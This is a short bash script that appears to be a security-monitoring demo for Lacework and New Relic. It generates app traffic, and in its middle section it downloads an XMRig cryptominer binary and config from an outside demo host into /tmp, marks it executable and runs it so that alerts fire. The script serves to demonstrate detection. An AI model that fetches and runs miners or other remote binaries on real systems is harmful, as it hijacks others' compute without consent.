#!/bin/bash

# Setup:
# You should already have installed the newrelic-infra agent.
# You should have configured a new relic alert channel in Lacework to send events
# You should have installed the Lacework quickstart in New Relic

# Install deps and run the Node app
npm install
node app.js &

# To generate a baseline of throughput & response time, call the app every second for 10 mins
for i in {1..600}
do
   sleep 1
   curl -s http://localhost:3000/hello\?sleep=0
done

# Let's launch xmrig
if [ ! -f /tmp/xmrig-demo ]; then
        echo "[INFO] XMRig not found, downloading XMRig now"
        curl http://lwmalwaredemo.com/xmrig -o /tmp/xmrig-demo
        curl http://lwmalwaredemo.com/config.json -o /tmp/config-demo.json
        chmod +x /tmp/xmrig-demo
else
	echo "[INFO] XMRig present, skipping download"
fi

if [ $(ps -ef | grep -v grep | grep xmrig-demo | awk '{print $2}'| wc -l) = "0" ]; then
        echo "[INFO] XMRig not running, starting now"
        /tmp/xmrig-demo -c /tmp/config-demo.json &
else
	echo "[INFO] XMRig already running"
fi

# Now let's generate a spike in response time for 5 minutes
for i in {1..150}
do
    sleep 1
    curl -s http://localhost:3000/hello\?sleep=1
done

# Kill the xmrig process
kill $(ps aux | grep xmrig-demo | awk '{print $2}')

# Let's pretend we fixed it and the spike goes down again
for i in {1..600}
do
   sleep 1
   curl -s http://localhost:3000/hello\?sleep=0
done